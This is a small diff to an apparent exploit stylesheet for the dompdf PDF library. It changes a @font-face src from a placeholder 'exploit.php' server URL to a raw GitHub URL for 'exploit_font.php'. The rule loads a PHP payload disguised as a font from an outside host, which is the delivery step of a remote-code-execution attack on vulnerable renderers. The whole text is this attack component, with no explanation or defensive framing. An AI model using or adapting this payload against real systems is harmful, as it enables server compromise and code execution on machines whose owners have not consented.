@@ -1,6 +1,6 @@
 @font-face {
   font-family:'afine';
-  src:url('http://[SERVER]/exploit.php');
+  src:url('https://raw.githubusercontent.com/Raptiler/DOMPDF_RCE/main/exploit_font.php');
   font-weight:'normal';
   font-style:'normal';
 }
